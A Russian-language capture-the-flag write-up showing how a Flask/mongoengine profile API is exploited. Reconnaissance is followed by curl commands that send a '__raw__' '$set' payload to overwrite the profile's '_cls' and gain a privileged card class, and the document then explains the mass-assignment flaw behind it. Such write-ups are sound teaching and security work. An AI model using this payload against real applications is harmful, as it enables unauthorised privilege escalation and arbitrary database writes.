# Peridromofilia - райтап

## Разведка

Блекбокс-сервис выдаёт набор мелочей, из которых собирается картина:

1. `/members` содержит техническую колонку «Право участия», в которой
   светятся внутренние коды карт: у свежих членов `Profile`, у ветеранов
   `GoldenProfile`, а у вахтёра каморки хранения - Галины Ивановны -
   `ServiceCard`. Это и есть цель: чужой класс профиля, который в клубе
   кто-то уже использует.
2. Исследование в `PATCH /api/profile` даёт характерные ошибки mongoengine:
   несуществующее поле - `Cannot resolve field`, кривой оператор -
   `Unknown modifier`. Так понимаем связку: Flask + mongoengine + MongoDB, и
   тело запроса уходит в `QuerySet.update()` как есть.
3. Ключи `set__profile__nickname` / `set__profile__home_station`
   работают - значит, контроллер отправляет пользовательский JSON прямо в
   kwargs апдейта. А вот `set__profile = {...}` с посторонним значением
   валидация embedded-поля не пускает: isinstance проверяет на подклассы
   `Profile`, и `ServiceCard` так не пролезает.

У embedded-документов mongoengine с включённым наследованием в базе лежит
служебное поле `_cls`, и при **каждом чтении** класс документа резолвится
через **глобальный реестр** `_DocumentRegistry` - без проверки иерархии.
Осталось записать в `profile` нужный `_cls` в обход валидации.

## Эксплойт

Нативный путь записи мимо модели - документированный escape hatch mongoengine:
оператор `__raw__` в `QuerySet.update()`, который уходит в MongoDB как есть.

```bash
# 1. регистрируемся и логинимся (cookie сессии)
curl -c c.txt -d 'username=hacker&password=hacker&nickname=h&home_station=Парк Культуры' \
     http://<host>/register -L

# 2. подменяем класс профиля поверх всех валидаций
curl -b c.txt -X PATCH http://<host>/api/profile \
     -H 'Content-Type: application/json' \
     -d '{"__raw__": {"$set": {"profile": {"_cls": "ServiceCard"}}}}'

# 3. открываем /me - статус карты отрисован, в нем флаг
curl -b c.txt http://<host>/me
```

## Почему это работает

1. `update(**{"__raw__": {...}})` - `handle_raw_query` в
   `mongoengine/queryset/transform.py` пропускает `__raw__` мимо всей
   обработки полей и валидации;
2. в БД документ получает `profile._cls = "ServiceCard"`;
3. embedded-поля не фильтруются queryset'ами (встроенные документы читаются
   не через запросы, поэтому `_cls IN <иерархия>` к ним не применяется), а
   `_from_son` слепо доверяет `_cls` и резолвит класс через глобальный
   реестр;

Уязвимость - классический mass assignment: контроллер профилей
уносит пользовательский JSON в ORM-овый `update` без ограничения полей, а 
`__raw__` превращает его в полноценную запись
произвольных данных в MongoDB.
